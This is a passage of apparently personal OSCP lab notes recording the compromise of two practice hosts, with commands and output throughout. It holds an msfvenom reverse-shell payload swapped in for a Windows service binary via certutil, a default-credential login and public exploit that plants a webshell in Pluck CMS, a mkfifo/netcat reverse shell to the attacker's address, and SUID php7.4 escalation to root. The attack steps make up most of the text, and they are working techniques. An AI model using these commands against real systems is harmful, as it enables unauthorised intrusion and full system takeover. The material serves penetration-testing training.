Dnscache               Running C:\Windows\system32\svchost.exe -k NetworkService -p                                    
DPS                    Running C:\Windows\System32\svchost.exe -k LocalServiceNoNetwork -p                             
DsmSvc                 Running C:\Windows\system32\svchost.exe -k netsvcs -p  
```

![[Pasted image 20240620193909.png]]

10. Generate msfvenom payload,  replace with bd.exe. 
```
┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.108 LPORT=80 -f exe -o reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: reverse.exe
```

![[Pasted image 20240620194022.png]]

```
PS C:\bd> mv bd.exe oldbd.exe
mv bd.exe oldbd.exe
PS C:\bd> ls
ls


    Directory: C:\bd


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----         5/3/2023   4:32 AM                applications                                                          
d-----         5/3/2023   4:32 AM                cache                                                                 
d-----         5/3/2023   4:32 AM                cmsdocs                                                               
d-----         5/3/2023   4:32 AM                data                                                                  
d-----         5/3/2023   4:32 AM                themes                                                                
d-----        4/26/2024   6:41 AM                trace                                                                 
-a----         5/3/2023   4:32 AM             34 bd.conf                                                               
-a----         5/3/2023   4:32 AM            259 bd.dat                                                                
-a----        6/12/2011   2:49 PM            207 bd.lua                                                                
-a----        4/26/2013   3:55 PM         912033 bd.zip                                                                
-a----        6/14/2012  10:21 AM          33504 bdctl.exe                                                             
-a----         5/3/2023   5:01 AM            135 drvcnstr.dat                                                          
-a----         5/3/2023   5:01 AM             40 emails.dat                                                            
-a----        12/3/2010   1:52 PM           5139 install.txt                                                           
-a----       10/26/2010   2:38 PM         421200 msvcp100.dll                                                          
-a----       10/26/2010   2:38 PM         770384 msvcr100.dll                                                          
-a----        2/18/2013   7:39 PM         240219 non-commercial-license.rtf                                            
-a----        4/26/2013   3:55 PM        1661648 oldbd.exe                                                             
-a----        4/26/2024   6:41 AM              6 pidfile                                                               
-a----        4/26/2013   3:50 PM          16740 readme.txt                                                            
-a----         5/3/2023   5:01 AM            808 roles.dat                                                             
-a----        6/14/2012  10:21 AM         383856 sqlite3.exe                                                           
-a----         5/3/2023   5:01 AM             78 tuncnstr.dat                                                          
-a----         5/3/2023   4:32 AM         133107 Uninstall.exe                                                         
-a----         5/3/2023   5:01 AM            509 user.dat 
```


```
PS C:\bd> certutil -urlcache -f http://192.168.49.108/reverse.exe bd.exe
certutil -urlcache -f http://192.168.49.108/reverse.exe bd.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

11. Restart 'bd' service. Obtained reverse shell and proof.txt
```
PS C:\bd> Restart-Service bd
Restart-Service bd
```

![[Pasted image 20240620194239.png]]

```
┌──(kali㉿kali)-[~/OSCP/exam]
└─$ sudo nc -nvlp 80     
listening on [any] 80 ...
connect to [192.168.49.108] from (UNKNOWN) [192.168.108.111] 49706
Microsoft Windows [Version 10.0.17763.4252]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

![[Pasted image 20240620194323.png]]

```
C:\Users\Administrator\Desktop>whoami
whoami
nt authority\system

C:\Users\Administrator\Desktop>type Proof.txt
type Proof.txt
5c1c1a8fa32bd66016fe8df307b69902

C:\Users\Administrator\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.108.111
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.108.254

```

![[Pasted image 20240620194401.png]]


## STANDALONE 3 - 112 

1. Started with Rustscan. 
```
┌──(kali㉿kali)-[~/OSCP/exam]
└─$ rustscan 192.168.108.112
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.108.112:22
Open 192.168.108.112:80
Open 192.168.108.112:592
Open 192.168.108.112:8080
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 22,80,592,8080 192.168.108.112

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-19 23:09 EDT
Initiating Ping Scan at 23:09
Scanning 192.168.108.112 [2 ports]
Completed Ping Scan at 23:09, 0.26s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 23:09
Completed Parallel DNS resolution of 1 host. at 23:09, 0.06s elapsed
DNS resolution of 1 IPs took 0.06s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 23:09
Scanning 192.168.108.112 [4 ports]
Discovered open port 80/tcp on 192.168.108.112
Discovered open port 22/tcp on 192.168.108.112
Discovered open port 8080/tcp on 192.168.108.112
Discovered open port 592/tcp on 192.168.108.112
Completed Connect Scan at 23:09, 0.27s elapsed (4 total ports)
Nmap scan report for 192.168.108.112
Host is up, received syn-ack (0.27s latency).
Scanned at 2024-06-19 23:09:02 EDT for 1s

PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack
80/tcp   open  http       syn-ack
592/tcp  open  eudora-set syn-ack
8080/tcp open  http-proxy syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.61 seconds
```

2. Followed with Nmap Scan 
```
┌──(kali㉿kali)-[~/OSCP/exam]
└─$ nmap -A -T4 -p 22,80,592,8080 192.168.108.112
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-19 23:23 EDT
Nmap scan report for 192.168.108.112
Host is up (0.26s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 52:00:5c:9a:9f:66:dd:7a:a1:84:8c:a4:98:ca:5c:c3 (RSA)
|   256 16:cc:a3:c9:db:a2:5d:dd:36:ae:b9:96:c5:69:6d:89 (ECDSA)
|_  256 b3:d4:45:6e:2c:c4:bf:81:cb:85:3b:8f:d6:b2:b2:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Pool Game
592/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-title: Coming Soon - Under Construction
|_Requested resource was http://192.168.108.112:592/?file=coming-soon
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: pluck 4.7.13
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
8080/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.60 seconds
```

3. Found the Pluck 4.7.12 running, Guessed login details admin:admin
![[Pasted image 20240620114644.png]]

5. Found exploit for that version. https://www.exploit-db.com/exploits/49909 

6. Run it with out changing anything. It worked. 
```
┌──(kali㉿kali)-[~/OSCP/exam]
└─$ python3 49909.py 192.168.108.112 592 admin /
/home/kali/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDncyWarning: urllib3 (1.26.8) or chardet (5.2.0)/charset_normalizer (2.0.12) doesn'h a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't matcpported "

Authentification was succesfull, uploading webshell

Uploaded Webshell to: http://192.168.108.112:592//files/shell.phar
```

6. Get a web shell on shown link. http://192.168.108.112:592//files/shell.phar

7. Get a reverse shell to local kali machine. 
```
p0wny@shell:…/2/files# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.49.108 80 >/tmp/f

┌──(kali㉿kali)-[~/OSCP/exam]
└─$ sudo nc -lvnp 80 
listening on [any] 80 ...
connect to [192.168.49.108] from (UNKNOWN) [192.168.108.112] 40260
bash: cannot set terminal process group (883): Inappropriate ioctl for device
bash: no job control in this shell
www-data@oscp:/var/www/html/2/files$ 
```

![[Pasted image 20240620114621.png]]

8. Found local.txt under tommy user
```
www-data@oscp:/home/tammy$ cat local.txt
cat local.txt
b10193c4da6eadd93697f5ad09be779d
www-data@oscp:/home/tammy$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
3: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:8a:b7:68 brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    inet 192.168.108.112/24 brd 192.168.108.255 scope global noprefixroute ens160
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:b768/64 scope link 
       valid_lft forever preferred_lft forever
```

![[Pasted image 20240620120125.png]]

9. Use php7.4 SUID for privilege escalation 
```
www-data@oscp:/home/tammy$  find / -perm -u=s -type f 2>/dev/null
 find / -perm -u=s -type f 2>/dev/null
/snap/snapd/14295/usr/lib/snapd/snap-confine
/snap/snapd/7264/usr/lib/snapd/snap-confine
/snap/core20/1270/usr/bin/chfn
/snap/core20/1270/usr/bin/chsh
/snap/core20/1270/usr/bin/gpasswd
/snap/core20/1270/usr/bin/mount
/snap/core20/1270/usr/bin/newgrp
/snap/core20/1270/usr/bin/passwd
/snap/core20/1270/usr/bin/su
/snap/core20/1270/usr/bin/sudo
/snap/core20/1270/usr/bin/umount
/snap/core20/1270/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1270/usr/lib/openssh/ssh-keysign
/snap/core18/2284/bin/mount
/snap/core18/2284/bin/ping
/snap/core18/2284/bin/su
/snap/core18/2284/bin/umount
/snap/core18/2284/usr/bin/chfn
/snap/core18/2284/usr/bin/chsh
/snap/core18/2284/usr/bin/gpasswd
/snap/core18/2284/usr/bin/newgrp
/snap/core18/2284/usr/bin/passwd
/snap/core18/2284/usr/bin/sudo
/snap/core18/2284/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2284/usr/lib/openssh/ssh-keysign
/snap/core18/1705/bin/mount
/snap/core18/1705/bin/ping
/snap/core18/1705/bin/su
/snap/core18/1705/bin/umount
/snap/core18/1705/usr/bin/chfn
/snap/core18/1705/usr/bin/chsh
/snap/core18/1705/usr/bin/gpasswd
/snap/core18/1705/usr/bin/newgrp
/snap/core18/1705/usr/bin/passwd
/snap/core18/1705/usr/bin/sudo
/snap/core18/1705/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1705/usr/lib/openssh/ssh-keysign
/usr/bin/php7.4
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/mount
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/fusermount
/usr/bin/su
/usr/bin/passwd
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/sbin/pppd


www-data@oscp:/home/tammy$ php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
SHELL=/bin/bash script -q /dev/null
bash-5.0$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash-5.0$ php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```

![[Pasted image 20240620115311.png]]